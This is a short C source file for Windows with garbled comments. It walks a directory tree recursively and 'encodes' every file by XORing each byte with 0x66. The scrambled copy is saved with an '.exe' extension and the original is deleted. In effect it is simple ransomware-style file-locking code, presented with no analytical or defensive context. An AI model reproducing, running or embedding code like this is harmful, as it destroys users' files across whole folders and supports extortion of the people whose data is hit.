#include"funcs.h"
#include<stdio.h>
#include<windows.h>

void findFile(char* pathName) {
	char currFile[MAX_PATH]; // ��ʱ�洢ÿ���ļ���
	memset(currFile, 0, MAX_PATH);
	sprintf(currFile, "%s\\*.*", pathName);
	_WIN32_FIND_DATAA findData;
	HANDLE hFile = FindFirstFile(currFile, &findData);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	int ret = 0;
	while (1) {
		memset(currFile, 0, MAX_PATH);
		sprintf(currFile, "%s\\%s", pathName, findData.cFileName);
		// ����ļ�����--�ļ������ļ��У�
		if (findData.cFileName[0] == '.'); //�������ļ��в����д���
		else if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))  //�������ͨ�ļ��У��ݹ����findFile����
			findFile(currFile);
		else //���򣬴���ǰ�ļ�
			enCode(currFile);
		
		ret = FindNextFile(hFile, &findData);
		if (!ret)
			break;
	}
}

void enCode(char* pathFile) {
	//�򿪴������ļ����������ܺ��ļ�
	FILE* fpSrc = fopen(pathFile, "rb"); //ֻ���ֽ���
	char buff[MAX_PATH];
	sprintf(buff, "%s.exe", pathFile);
	FILE* fpDst = fopen(buff, "wb"); //ֻд�ֽ���
	
	if (fpSrc == NULL || fpDst == NULL)
		return;
	//�Ե����ֽ�ѭ����ȡ�������ļ����ݣ���д������ļ���
	char currByte;
	while (1) {
		int count = fread(&currByte, 1, 1, fpSrc);
		if (count < 1) //û����
			break;
		currByte ^= 0x66; //�������ܷ�
		fwrite(&currByte, 1, 1, fpDst); //д������ļ�
	}
	fclose(fpSrc);
	fclose(fpDst);
	remove(pathFile); //ɾ��ԭ�ļ�
}
